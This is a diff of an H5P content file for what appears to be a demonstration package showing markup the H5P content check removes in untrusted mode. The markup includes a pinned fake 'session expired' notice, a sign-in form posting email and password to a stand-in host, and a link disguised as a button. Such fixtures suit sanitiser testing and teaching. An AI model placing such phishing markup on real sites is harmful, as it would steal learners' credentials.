@@ -4,7 +4,7 @@
       "content": {
         "library": "H5P.AdvancedText 1.1",
         "params": {
-          "text": "<h2>Markup the content check removes</h2><p>The text below holds markup an author could not have saved on an H5P site: a notice pinned over the content, a sign-in form and a link dressed as a button. Played <strong>Trusted</strong>, it shows as written. Switch to <strong>Untrusted</strong> and the content check removes what the field does not allow before the content starts, as the H5P plugins for Moodle, WordPress and Drupal do when an author uploads it. Words and the colours an author may choose stay.</p><p>None of it runs a script in either mode: the frame&rsquo;s policy refuses inline scripts and handlers, and would refuse to send the form. What markup does without a script, asking a learner for a password, is the risk.</p>"
+          "text": "<h2>Markup the content check removes</h2><p>This package holds markup an H5P site would never let an author save. Each part below says what to look for. Switch between <strong>Trusted</strong> and <strong>Untrusted</strong> above the player to compare: untrusted, the content check removes what a field does not allow before the content starts, as the H5P plugins for Moodle, WordPress and Drupal do with an upload.</p><p>It is harmless here. Nothing in it runs a script in either mode, and the form and the link point at a domain that does not exist.</p>"
         },
         "subContentId": "8f3c2a61-4b7e-4d2a-9c11-5e6f7a8b9c01",
         "metadata": {
@@ -19,13 +19,13 @@
       "content": {
         "library": "H5P.AdvancedText 1.1",
         "params": {
-          "text": "<div style=\"position:fixed;top:0;left:0;right:0;z-index:2147483647;padding:12px 16px;background-color:#b4232a;color:#ffffff;font-weight:bold\">Your session has expired. Sign in below to keep your progress.</div>"
+          "text": "<h3>1. A notice over the page</h3><p><strong>Trusted:</strong> a red notice pinned to the corner of the player, over the content. <strong>Untrusted:</strong> the pinning is removed, and the notice stays here in the colours a text may have.</p><div style=\"position:fixed;right:16px;bottom:16px;z-index:2147483647;max-width:300px;padding:12px 16px;border-radius:8px;box-shadow:0 6px 24px rgba(0,0,0,0.25);background-color:#b4232a;color:#ffffff;font-weight:bold\">Your session has expired. Sign in below to keep your progress.</div>"
         },
         "subContentId": "3d9b7e42-1c5a-4f8e-8a3b-6c2d1e0f9a02",
         "metadata": {
           "contentType": "Text",
           "license": "U",
-          "title": "A notice pinned over the content"
+          "title": "A notice over the page"
         }
       },
       "useSeparator": "auto"
@@ -34,7 +34,7 @@
       "content": {
         "library": "H5P.AdvancedText 1.1",
         "params": {
-          "text": "<form action=\"https://sign-in.example/collect\" method=\"post\"><p><label>Email <input type=\"email\" name=\"email\" autocomplete=\"off\"></label></p><p><label>Password <input type=\"password\" name=\"password\" autocomplete=\"off\"></label></p><p><button type=\"submit\">Sign in</button></p></form>"
+          "text": "<h3>2. A sign-in form</h3><p><strong>Trusted:</strong> fields asking for an email and a password. <strong>Untrusted:</strong> the form and its fields are removed, and only their words stay.</p><form action=\"https://sign-in.example/collect\" method=\"post\" style=\"max-width:320px;padding:16px;border:1px solid #d0d7de;border-radius:8px\"><p><label>Email<br><input type=\"email\" name=\"email\" autocomplete=\"off\" style=\"width:100%;box-sizing:border-box;margin-top:4px;padding:8px 10px;border:1px solid #c9d0d9;border-radius:6px;font:inherit\"></label></p><p><label>Password<br><input type=\"password\" name=\"password\" autocomplete=\"off\" style=\"width:100%;box-sizing:border-box;margin-top:4px;padding:8px 10px;border:1px solid #c9d0d9;border-radius:6px;font:inherit\"></label></p><p><button type=\"submit\" style=\"padding:8px 18px;border:0;border-radius:6px;background-color:#1d7a42;color:#ffffff;font:inherit\">Sign in</button></p></form>"
         },
         "subContentId": "c7e1f093-5a2b-4c6d-9e8f-0a1b2c3d4e03",
         "metadata": {
@@ -49,7 +49,7 @@
       "content": {
         "library": "H5P.AdvancedText 1.1",
         "params": {
-          "text": "<p><a href=\"https://sign-in.example/\" style=\"display:inline-block;padding:10px 18px;border-radius:6px;background-color:#2f6df6;color:#ffffff;text-decoration:none\">Continue to your course</a></p>"
+          "text": "<h3>3. A link dressed as a button</h3><p><strong>Trusted:</strong> a button. <strong>Untrusted:</strong> a plain link, since a link may not carry a style.</p><p><a href=\"https://sign-in.example/\" style=\"display:inline-block;padding:10px 18px;border-radius:6px;background-color:#2f6df6;color:#ffffff;text-decoration:none\">Continue to your course</a></p>"
         },
         "subContentId": "5b2e8d14-9f6a-4a3c-b7d1-2e4f6a8c0b04",
         "metadata": {
